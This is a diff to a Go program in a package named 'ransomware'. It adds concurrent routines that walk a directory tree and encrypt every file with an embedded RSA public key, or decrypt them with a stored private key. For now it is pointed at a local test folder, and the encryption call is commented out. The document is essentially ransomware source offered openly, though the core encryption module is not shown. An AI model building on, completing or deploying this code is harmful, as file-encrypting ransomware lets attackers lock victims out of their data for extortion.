@@ -1,37 +1,12 @@
 package main
 
 import (
-	"fmt"
+	"io/fs"
 	"os"
-	io "ransomware/io"
+	"path/filepath"
+	"ransomware/io"
 	"sync"
 )
-
-var waitGroup sync.WaitGroup
-
-func main() {
-
-	var err error
-	// privateKey, _ := rsa.GenerateKey(rand.Reader, 2048)
-	// publicKey := &privateKey.PublicKey
-	// io.StorePrivateKey(privateKey)
-	// io.StorePublicKey(publicKey)
-
-	// publicKey := io.ReadPublicKey("publicKey.pem")
-	privateKey := io.ReadPrivateKey("privateKey.pem")
-
-	// publicKey := io.DecodePublicKey(pubKeyPem)
-
-	fInfo, _ := os.Lstat("teste.png")
-
-	teste := io.File{Info: fInfo, Path: "teste.png", Extension: "png"}
-	// err = teste.Encrypt(publicKey)
-	err = teste.Decrypt(privateKey)
-	if err != nil {
-		fmt.Println(err)
-	}
-
-}
 
 var (
 	pubKeyPem = []byte(`-----BEGIN RSA PUBLIC KEY-----
@@ -43,4 +18,78 @@ gx2OnSXMC0aDiDYcT+tifBURuQUTw/qe3wqVfvzrGNvHU+c/Z85hUMwhSB8lpfRo
 tr1zd788DLQbesmVBKCANqdanyLnsUtVjQIDAQAB
 -----END RSA PUBLIC KEY-----
 `)
+	publicKey  = io.DecodePublicKey(pubKeyPem)
+	privateKey = io.ReadPrivateKey("privateKey.pem")
+	waitGroup  sync.WaitGroup
+
+	filesToVisit = make(chan io.File)
 )
+
+func main() {
+
+	currentDirectory, _ := os.Getwd()
+
+	// encryptFiles(string(currentDirectory + "/testFolder"))
+	decryptFiles(string(currentDirectory + "/testFolder"))
+
+	waitGroup.Wait()
+
+}
+
+func encryptFiles(dirPath string) {
+
+	waitGroup.Add(1)
+	go func() {
+		filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, err error) error {
+			if !d.IsDir() {
+				info, err := d.Info()
+				if err != nil {
+					return err
+				}
+
+				filesToVisit <- io.File{Info: info, Path: path, Extension: ""}
+			}
+			return nil
+		})
+
+		defer close(filesToVisit)
+		defer waitGroup.Done()
+	}()
+
+	waitGroup.Add(1)
+	go func() {
+		for file := range filesToVisit {
+			file.Encrypt(publicKey)
+		}
+		defer waitGroup.Done()
+	}()
+}
+
+func decryptFiles(dirPath string) {
+
+	waitGroup.Add(1)
+	go func() {
+		filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, err error) error {
+			if !d.IsDir() {
+				info, err := d.Info()
+				if err != nil {
+					return err
+				}
+
+				filesToVisit <- io.File{Info: info, Path: path, Extension: ""}
+			}
+			return nil
+		})
+
+		defer close(filesToVisit)
+		defer waitGroup.Done()
+	}()
+
+	waitGroup.Add(1)
+	go func() {
+		for file := range filesToVisit {
+			file.Decrypt(privateKey)
+		}
+		defer waitGroup.Done()
+	}()
+}
